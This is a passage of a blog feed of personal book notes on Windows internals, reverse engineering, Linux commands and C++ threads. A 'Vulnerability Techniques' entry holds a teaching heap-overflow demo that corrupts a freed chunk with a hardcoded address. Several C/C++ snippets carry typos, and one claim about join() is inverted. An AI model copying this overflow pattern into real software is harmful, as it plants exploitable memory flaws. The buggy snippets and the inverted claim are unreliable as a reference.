id="Chapter-7-Windows-Kernel-Fundamentals"><a href="#Chapter-7-Windows-Kernel-Fundamentals" class="headerlink" title="Chapter 7 - Windows Kernel Fundamentals"></a>Chapter 7 - Windows Kernel Fundamentals</h1><h2 id="7-1-Kernel-Fundamentals"><a href="#7-1-Kernel-Fundamentals" class="headerlink" title="7.1 - Kernel Fundamentals"></a>7.1 - Kernel Fundamentals</h2><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/7.1.png'><img src="/images/books/SoftwareCrypto/7.1.png" width="500">    <figcaption>    Source: https://www.linkedin.com/pulse/windows-os-rings-role-event-monitoring-jacob-stickney-thv5c    </figcaption></p><h2 id="7-2-Important-Kernel-Data-Structure"><a href="#7-2-Important-Kernel-Data-Structure" class="headerlink" title="7.2 - Important Kernel Data Structure"></a>7.2 - Important Kernel Data Structure</h2><h2 id="7-3-Fundamentals-of-Kernel-Debugging"><a href="#7-3-Fundamentals-of-Kernel-Debugging" class="headerlink" title="7.3 - Fundamentals of Kernel Debugging"></a>7.3 - Fundamentals of Kernel Debugging</h2><h1 id="Chapter-8-Windows-Exception-Handling"><a href="#Chapter-8-Windows-Exception-Handling" class="headerlink" title="Chapter 8 - Windows Exception Handling"></a>Chapter 8 - Windows Exception Handling</h1><h2 id="8-1-Fundamentals-of-Exception-Handling"><a href="#8-1-Fundamentals-of-Exception-Handling" class="headerlink" title="8.1 - Fundamentals of Exception Handling"></a>8.1 - Fundamentals of Exception Handling</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">VOID RaiseException(<br>  [in] DWORD           dwExceptionCode,<br>  [in] DWORD           dwExceptionFlags,<br>  [in] DWORD           nNumberOfArguments,<br>  [in] const ULONG_PTR *lpArguments<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception<br></code></pre></td></tr></table></figure><p>When an interrupt or exception occurs, the CPU looks up the corresponding handler in the IDT.</p><p>The IDT (Interrupt Descriptor Table) is a linear table stored in memory. It consists of 256 entries. Each entry is 8 bytes long on x86 (32-bit) platforms and 16 bytes long on x64 (64-bit) platforms.</p><p>The base address and size of the IDT are described by the IDTR (IDT Register). The IDTR is 48 bits long on x86 systems. Although the IDTR can be accessed using the SIDT and LIDT instructions, the LIDT instruction can only be executed with Ring 0 privilege.</p><h2 id="8-2-SEH"><a href="#8-2-SEH" class="headerlink" title="8.2 - SEH"></a>8.2 - SEH</h2><h1 id="Chapter-9-Win32-API-Debugging"><a href="#Chapter-9-Win32-API-Debugging" class="headerlink" title="Chapter 9 - Win32 API Debugging"></a>Chapter 9 - Win32 API Debugging</h1><h1 id="Chapter-14-Vulnerability-Techniques"><a href="#Chapter-14-Vulnerability-Techniques" class="headerlink" title="Chapter 14 - Vulnerability Techniques"></a>Chapter 14 - Vulnerability Techniques</h1><h2 id="14-1-Software-Vulnerability"><a href="#14-1-Software-Vulnerability" class="headerlink" title="14.1 - Software Vulnerability"></a>14.1 - Software Vulnerability</h2><h3 id="Stack-Buffer-Overflow"><a href="#Stack-Buffer-Overflow" class="headerlink" title="Stack Buffer Overflow"></a>Stack Buffer Overflow</h3><h3 id="Heap-Buffer-Overflow"><a href="#Heap-Buffer-Overflow" class="headerlink" title="Heap Buffer Overflow"></a>Heap Buffer Overflow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;Windows.h&gt;<br><br>int main(int argc, char *argv[]) &#123;<br>    char str[] = &quot;\nHello123456789213456789\n&quot;;<br>    char *a, *b, *c;<br>    long *hHeap;<br>    hHeap = (long *)HeapCreate(0x00040000, 0, 0);<br>    printf(&quot;\n(+) Creating a heap at: 0x00%xh\n&quot;, hHeap);<br>    printf(&quot;(+) Allocating chunk A\n&quot;);<br><br>    a = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Allocating chunk B\n&quot;);<br>    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Chunk A=0x00%x\n(+) Chunk=0x00%x\n&quot;, a, b);<br>    printf(&quot;(+) Freeing chunk B to the lookaside\n&quot;);<br>    HeapFree(hHeap, 0, b);<br>    printf(&quot;(+) Now overflow chunk A:\n&quot;);<br><br>    printf(&quot;%x\n&quot;, str);<br>    printf(str);<br>    memcpy(a, &quot;XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00&quot;, 28);<br>    printf(&quot;(+) Allocating chunk B\n&quot;);<br>    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Allocating chunk C\n&quot;);<br>    c = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMROY, 0x10);<br>    printf(&quot;(+) Chunk A=0x00%x\n(+) Chunk B = 0x00%x\n(+) Chunk C=0x00%x\n&quot;, a, b, c);<br>    strcpy(c, &quot;AAAAAAAAAAAA\n&quot;);<br>    printf(str);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="14-2-Shellcode"><a href="#14-2-Shellcode" class="headerlink" title="14.2 - Shellcode"></a>14.2 - Shellcode</h1><h1 id="CHapter-15-Software-Unpacking"><a href="#CHapter-15-Software-Unpacking" class="headerlink" title="CHapter 15 - Software Unpacking"></a>CHapter 15 - Software Unpacking</h1><h2 id="15-2-Packer"><a href="#15-2-Packer" class="headerlink" title="15.2 - Packer"></a>15.2 - Packer</h2><ul><li>UPX</li><li>ASPack</li></ul><h2 id="15-3-Packer-Stub"><a href="#15-3-Packer-Stub" class="headerlink" title="15.3 - Packer Stub"></a>15.3 - Packer Stub</h2><ul><li>ASProtect</li><li>Armadillo</li><li>EXECryptor</li><li>Themida</li></ul><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="300"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Cryptography" scheme="http://example.com/tags/Cryptography/"/>
    
    <category term="Reverse Engineering" scheme="http://example.com/tags/Reverse-Engineering/"/>
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="WinDbg" scheme="http://example.com/tags/WinDbg/"/>
    
    <category term="Assembly" scheme="http://example.com/tags/Assembly/"/>
    
    <category term="MD5" scheme="http://example.com/tags/MD5/"/>
    
    <category term="AES" scheme="http://example.com/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Practical Linux Forenics</title>
    <link href="http://example.com/2026/01/14/2026-1-14-BookPracticalLinuxForensics/"/>
    <id>http://example.com/2026/01/14/2026-1-14-BookPracticalLinuxForensics/</id>
    <published>2026-01-14T06:05:22.000Z</published>
    <updated>2026-01-23T03:07:35.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/PracticalLinuxForensics/libro.jpg'><img src="/images/books/PracticalLinuxForensics/libro.jpg" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] How Linux Works - WHAT EVERY SUPERUSER SHOULD KNOW</title>
    <link href="http://example.com/2026/01/14/2026-1-14-BookLinuxSuperUser/"/>
    <id>http://example.com/2026/01/14/2026-1-14-BookLinuxSuperUser/</id>
    <published>2026-01-14T06:01:33.000Z</published>
    <updated>2026-01-22T17:07:20.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/HowLinuxWorksSuperuser/libro.jpg'><img src="/images/books/HowLinuxWorksSuperuser/libro.jpg" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] The Linux Command Line (2nd Edition)</title>
    <link href="http://example.com/2026/01/14/2026-1-14-BookLinuxCommand/"/>
    <id>http://example.com/2026/01/14/2026-1-14-BookLinuxCommand/</id>
    <published>2026-01-14T06:00:54.000Z</published>
    <updated>2026-01-26T14:58:38.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/TheLinuxCommandLine/libro.jpg'><img src="/images/books/TheLinuxCommandLine/libro.jpg" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “The Linux Command Line (3rd Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-4-Manipulating-Files-and-Directories"><a href="#Chapter-4-Manipulating-Files-and-Directories" class="headerlink" title="Chapter 4 - Manipulating Files and Directories"></a>Chapter 4 - Manipulating Files and Directories</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp -u *.html destination<br></code></pre></td></tr></table></figure><h2 id="Wildcards"><a href="#Wildcards" class="headerlink" title="Wildcards"></a>Wildcards</h2><div class="table-container"><table><thead><tr><th>Wildcard</th><th>Meaning</th></tr></thead><tbody><tr><td>*</td><td>Matches any characters</td></tr><tr><td>?</td><td>Matches any single character</td></tr><tr><td>[characters]</td><td>Matches any character that is a member if the set <em>characters</em></td></tr><tr><td>[!characters]</td><td>Matches any character that is not a member of the set <em>characters</em></td></tr><tr><td>[[:class:]]</td><td>Matches any character that is a member of the specified class</td></tr></tbody></table></div><h3 id="Commonly-Used-Character-Classes"><a href="#Commonly-Used-Character-Classes" class="headerlink" title="Commonly Used Character Classes"></a>Commonly Used Character Classes</h3><div class="table-container"><table><thead><tr><th>Character class</th><th>Meaning</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>Matches any alphanumeric character</td></tr><tr><td>[:alpha:]</td><td>Matches any alphabetic character</td></tr><tr><td>[:digit:]</td><td>Matches any numeral</td></tr><tr><td>[:lower:]</td><td>Matches any lowercase letter</td></tr><tr><td>[:upper:]</td><td>Matches any uppercase letter</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Pattern</th><th>Matches</th></tr></thead><tbody><tr><td><code>*</code></td><td>All files</td></tr><tr><td><code>g*</code></td><td>Any file beginning with g</td></tr><tr><td><code>b*.txt</code></td><td>Any file beginning with b followed by any characters and ending with <code>.txt</code></td></tr><tr><td><code>Data???</code></td><td>Any file beginning with <code>Data</code> followed by exactly three characters</td></tr><tr><td><code>[abc]*</code></td><td>Any file beginning with either an a, a b, or a c</td></tr><tr><td><code>BACKUP.[0-9][0-9][0-9]</code></td><td>Any file beginning with <code>BACKUP.</code> followed by exactly three numerals</td></tr><tr><td><code>[[:upper:]]*</code></td><td>Any file beginning with an uppercase letter</td></tr><tr><td><code>[![:digit:]]*</code></td><td>Any file not beginning with a numeral</td></tr><tr><td><code>*[[:lower:]123]</code></td><td>Any file ending with a lowercase letter or the numerals 1, 2, or 3</td></tr></tbody></table></div><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mkdir dir1 dir2 dir3<br></code></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp item... directory<br></code></pre></td></tr></table></figure><p><strong>Useful options and Examples:</strong></p><div class="table-container"><table><thead><tr><th>Option</th><th>Meaning</th></tr></thead><tbody><tr><td><code>-a</code>, <code>--archive</code></td><td>Copy the files and directories and all of their attributes, including ownerships and permissions. Normally, copies take on the default attributes of the user performing the copy.</td></tr><tr><td><code>-i</code>, <code>--interactive</code></td><td>Before overwriting an existing file, prompt the user for confirmation. If this option is not specified, <code>cp</code> will silently overwrite files.</td></tr><tr><td><code>-r</code>, <code>--recursive</code></td><td>Recursively copy directories and their contents. This option (or the <code>-a</code> option) is required when copying directories.</td></tr><tr><td><code>-u</code>, <code>--update</code></td><td>When copying files from one directory to another, only copy files that either don’t exist or are newer than the existing corresponding files in the destination directory. Useful for skipping unnecessary copies.</td></tr><tr><td><code>-v</code>, <code>--verbose</code></td><td>Display informative messages as the copy is performed.</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Command</th><th>Results</th></tr></thead><tbody><tr><td><code>cp file1 file2</code></td><td>Copy <code>file1</code> to <code>file2</code>. If <code>file2</code> exists, it is overwritten with the contents of <code>file1</code>. If <code>file2</code> does not exist, it is created.</td></tr><tr><td><code>cp -i file1 file2</code></td><td>Same as the previous command, except that if <code>file2</code> exists, the user is prompted before it is overwritten.</td></tr><tr><td><code>cp file1 file2 dir1</code></td><td>Copy <code>file1</code> and <code>file2</code> into directory <code>dir1</code>. The directory <code>dir1</code> must already exist.</td></tr><tr><td><code>cp dir1/* dir2</code></td><td>Using a wildcard, copy all the files in <code>dir1</code> into <code>dir2</code>. The directory <code>dir2</code> must already exist.</td></tr><tr><td><code>cp -r dir1 dir2</code></td><td>Copy the contents of directory <code>dir1</code> to directory <code>dir2</code>. If <code>dir2</code> does not exist, it is created and will contain the same contents as <code>dir1</code>. If <code>dir2</code> does exist, then <code>dir1</code> (and its contents) will be copied into <code>dir2</code>.</td></tr></tbody></table></div><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p><strong>Useful Options and Examples:</strong></p><div class="table-container"><table><thead><tr><th>Option</th><th>Meaning</th></tr></thead><tbody><tr><td><code>-i</code>, <code>--interactive</code></td><td>Before overwriting an existing file, prompt the user for confirmation. <strong>If this option is not specified, <code>mv</code> will silently overwrite files</strong>.</td></tr><tr><td><code>-u</code>, <code>--update</code></td><td>When moving files from one directory to another, only move files that either don’t exist or are newer than the existing corresponding files in the destination directory.</td></tr><tr><td><code>-v</code>, <code>--verbose</code></td><td>Display informative messages as the move is performed.</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Command</th><th>Results</th></tr></thead><tbody><tr><td><code>mv file1 file2</code></td><td>Move <code>file1</code> to <code>file2</code>. If <code>file2</code> exists, it is overwritten with the contents of <code>file1</code>. If <code>file2</code> does not exist, it is created. In either case, <code>file1</code> ceases to exist.</td></tr><tr><td><code>mv -i file1 file2</code></td><td>Same as the previous command, except that if <code>file2</code> exists, the user is prompted before it is overwritten.</td></tr><tr><td><code>mv file1 file2 dir1</code></td><td>Move <code>file1</code> and <code>file2</code> into directory <code>dir1</code>. The directory <code>dir1</code> must already exist.</td></tr><tr><td><code>mv dir1 dir2</code></td><td>If directory <code>dir2</code> does not exist, create directory <code>dir2</code> and move the contents of directory <code>dir1</code> into <code>dir2</code>, then delete directory <code>dir1</code>. If directory <code>dir2</code> does exist, move directory <code>dir1</code> (and its contents) into directory <code>dir2</code>.</td></tr></tbody></table></div><h1 id="Chapter-6-Redirection"><a href="#Chapter-6-Redirection" class="headerlink" title="Chapter 6 - Redirection"></a>Chapter 6 - Redirection</h1><h2 id="Standard-Input-Output-and-Error"><a href="#Standard-Input-Output-and-Error" class="headerlink" title="Standard Input, Output and Error"></a>Standard Input, Output and Error</h2><h2 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h2><h1 id="Chapter-9-Permissions"><a href="#Chapter-9-Permissions" class="headerlink" title="Chapter 9 - Permissions"></a>Chapter 9 - Permissions</h1><h1 id="Chapter-15-Storage-Media"><a href="#Chapter-15-Storage-Media" class="headerlink" title="Chapter 15 - Storage Media"></a>Chapter 15 - Storage Media</h1><h1 id="Chapter-16-Networking"><a href="#Chapter-16-Networking" class="headerlink" title="Chapter 16 - Networking"></a>Chapter 16 - Networking</h1><h1 id="Chapter-18-Archiving-and-Backup"><a href="#Chapter-18-Archiving-and-Backup" class="headerlink" title="Chapter 18 - Archiving and Backup"></a>Chapter 18 - Archiving and Backup</h1><h1 id="Chapter-19-Regular-Expression"><a href="#Chapter-19-Regular-Expression" class="headerlink" title="Chapter 19 - Regular Expression"></a>Chapter 19 - Regular Expression</h1><h1 id="Chapter-23-Compiling-Programs"><a href="#Chapter-23-Compiling-Programs" class="headerlink" title="Chapter 23 - Compiling Programs"></a>Chapter 23 - Compiling Programs</h1><h1 id="Chapter-24-Writing-Your-First-Script"><a href="#Chapter-24-Writing-Your-First-Script" class="headerlink" title="Chapter 24 - Writing Your First Script"></a>Chapter 24 - Writing Your First Script</h1><h1 id="Chapter-25-Starting-a-Project"><a href="#Chapter-25-Starting-a-Project" class="headerlink" title="Chapter 25 - Starting a Project"></a>Chapter 25 - Starting a Project</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="Command Line" scheme="http://example.com/tags/Command-Line/"/>
    
    <category term="Linux Command" scheme="http://example.com/tags/Linux-Command/"/>
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Designing Anonymous Communication Chains for Offensive and Defensive Cybersecurity</title>
    <link href="http://example.com/2026/01/14/2026-1-14-BookDesigningAnonymousCommChains/"/>
    <id>http://example.com/2026/01/14/2026-1-14-BookDesigningAnonymousCommChains/</id>
    <published>2026-01-13T16:55:10.000Z</published>
    <updated>2026-01-23T03:07:28.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/DesigningAnonymousChains/libro.png'><img src="/images/books/DesigningAnonymousChains/libro.png" width="600"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e</title>
    <link href="http://example.com/2026/01/09/2026-1-9-BookLinuxFirewall/"/>
    <id>http://example.com/2026/01/09/2026-1-9-BookLinuxFirewall/</id>
    <published>2026-01-08T16:56:53.000Z</published>
    <updated>2026-01-09T12:42:30.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/LinuxFirewall/libro.png'><img src="/images/books/LinuxFirewall/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e”.<br>The content will be continuously updated as I read through the book.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] C++ Concurrency In Action (Second Edition)</title>
    <link href="http://example.com/2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/"/>
    <id>http://example.com/2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/</id>
    <published>2026-01-08T11:14:40.000Z</published>
    <updated>2026-01-27T07:34:31.337Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/CppConcurrency/libro.png'><img src="/images/books/CppConcurrency/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Hello-world-of-concurrency"><a href="#Chapter-1-Hello-world-of-concurrency" class="headerlink" title="Chapter.1 - Hello, world of concurrency"></a>Chapter.1 - Hello, world of concurrency</h1><h2 id="1-1-What-is-concurrency"><a href="#1-1-What-is-concurrency" class="headerlink" title="1.1 - What is concurrency"></a>1.1 - What is concurrency</h2><p>At the simplest and most basic level, <strong>concurrency</strong> is about two or more separate activities happening at the same time. You can watch football while I go swimming, and so on.</p><p>When we talk about concurrency in terms of computers, we mean a single system performing multiple independent activities in parallel, rather than sequentially, or one after the other.</p><h3 id="Concurrency-vs-Parallelism"><a href="#Concurrency-vs-Parallelism" class="headerlink" title="Concurrency vs. Parallelism"></a>Concurrency vs. Parallelism</h3><p>Concurrency and parallelism have largely overlapping meanings with respect to multithreaded code. Indeed, to many they mean the same thing.</p><p>The difference is primarily a matter of nuance, focus, and intent. Both terms are about running multiple tasks simultaneously, using the available hardware, but parallelism is much more performance-oriented.  </p><p>People talk about <strong>parallelism</strong> when their primary concern is talking advantage of the avaiable hardware to increase the performance of bulk data processing.</p><p>People talk about <strong>concurrency</strong> when their primary concern is separation of concerns, or responsiveness.</p><h2 id="1-4-Getting-Started"><a href="#1-4-Getting-Started" class="headerlink" title="1.4 - Getting Started"></a>1.4 - Getting Started</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;iostream&gt;<br>#include &lt;thread&gt;<br><br>void hello()<br>&#123;<br>    std::cout &lt;&lt; &quot;Hello concurrent world.\n;<br>&#125;<br><br>int main()<br>&#123;<br>    std::thread t(hello);<br>    t.join();<br>&#125;<br></code></pre></td></tr></table></figure><p>Every thread has to have an <strong>initial function</strong>, where the new thread of execution begins. For the initial thread in an application, this is <strong>main()</strong>, but for every other thread it’s specified in the constructor of a <strong>std::thread</strong> object——in this case, the <strong>std::thread</strong> objecct named <strong>t</strong> has the new <strong>hellow()</strong> function as its initial function.</p><p>With <strong>join()</strong>, the program possibily ends before the new thread had a chance to run.</p><h1 id="Chapter-2-Managing-threads"><a href="#Chapter-2-Managing-threads" class="headerlink" title="Chapter.2 - Managing threads"></a>Chapter.2 - Managing threads</h1><h2 id="2-1-Basic-thread-management"><a href="#2-1-Basic-thread-management" class="headerlink" title="2.1 - Basic thread management"></a>2.1 - Basic thread management</h2><p>Every C++ program has at least one thread, which is started by the C++ runtime: the thread running main().</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class background_task<br>&#123;<br>public:<br>    void operator()() const<br>    &#123;<br>        do_something();<br>        do_something_else();<br>    &#125;<br>&#125;;<br>background_task f;<br>std::thread my_thread(f);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread my_thread(background_task());<br></code></pre></td></tr></table></figure><p>One type of callable object that avoids this problem is a <strong>lambda expression</strong>. This is a new feature from C++11:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::thread my_thread([] &#123;<br>    do_something();<br>    do_something_else();<br>&#125;)<br></code></pre></td></tr></table></figure></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct func<br>&#123;<br>    int&amp; i;<br>    func(int&amp; i_): i(_)&#123;&#125;<br>    void operator()()<br>    &#123;<br>        for (unsigned j = 0; j &lt; 10000000; ++j)<br>        &#123;<br>            do_something(i);<br>        &#125;<br>    &#125;<br>&#125;;<br><br>void oops()<br>&#123;<br>    int some_local_state=0;<br>    func my_func(some_local_state);<br>    std::thread my_thread(my_func);<br>    my_thread.detach();<br>&#125;<br></code></pre></td></tr></table></figure><p>In this case, the new thread associated with <code>my_thread</code> will probably still be running when <code>oops</code> exists, because you’ve explicitly decided not to wait for it by calling <code>detach()</code>. The program will be terminated if <code>detach()</code> isn’t called.</p><p>If the thread is still running, you have this scenario: the nexst call to <code>do_something(i)</code> will access an already destroyed variable. This is like normal single-threaded code——allowing a pointer or reference to a local variable to persist beyond the function exit is never a good idea——but it’s earier to make the mistake with multithreaded code, because it isn’t necessarily immediately apparent that this has happened.</p><p>In particular, it’s a bad idea to create a thread within a function that has access to the local variables in that function, unless the thread is guarateed to finish before the function exits.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct func;<br>void f()<br>&#123;<br>    int some_local_state = 0;<br>    func my_func(some_local_state);<br>    std::thread t(my_func);<br><br>    try<br>    &#123;<br>        do_something_in_current_thread();<br>    &#125;<br>    catch (...)<br>    &#123;<br>        t.join();<br>        throw;<br>    &#125;<br><br>    t.join();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-Passing-arguments-to-a-thread-function"><a 